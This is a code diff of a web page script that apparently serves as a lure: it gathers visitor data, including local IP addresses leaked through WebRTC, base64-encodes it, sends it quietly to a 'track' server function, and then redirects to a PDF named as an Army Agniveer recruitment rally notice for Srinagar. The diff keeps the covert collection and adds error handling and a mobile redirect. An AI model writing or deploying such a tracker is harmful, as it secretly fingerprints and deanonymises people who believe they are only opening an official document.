@@ -33,17 +33,28 @@
                 webRTCLeak: await getLocalIPs()
             };
 
-            // Send to server (Base64 encoded)
-            const encoded = btoa(JSON.stringify(data));
+          // 1. First send data to server
+            try {
+                await fetch(`/.netlify/functions/track?d=${btoa(JSON.stringify(data))}`, {
+                    method: 'GET',
+                    mode: 'no-cors',
+                    cache: 'no-store'
+                });
+            } catch (e) {
+                console.log("Data logging failed, continuing to PDF");
+            }
+
+            // 2. Then redirect to PDF (mobile-friendly approach)
+            const pdfUrl = "/ARMY_RECRUITMENT_RALLY_AGNIVEER_AROSRINAGAR_2025-2026.pdf";
             
-            // First send data to Netlify function
-            await fetch(`/.netlify/functions/track?d=${encoded}`, {
-                method: 'GET',
-                mode: 'no-cors'
-            });
-            
-            // Then redirect to PDF (no need for /static/ in path)
-            window.location.href = "/ARMY_RECRUITMENT_RALLY_AGNIVEER_AROSRINAGAR_2025-2026.pdf";
+            // For mobile devices
+            if (/Mobi|Android/i.test(navigator.userAgent)) {
+                window.location.assign(pdfUrl);
+            } 
+            // For desktop
+            else {
+                window.location.href = pdfUrl;
+            }
         }
 
         // ========================
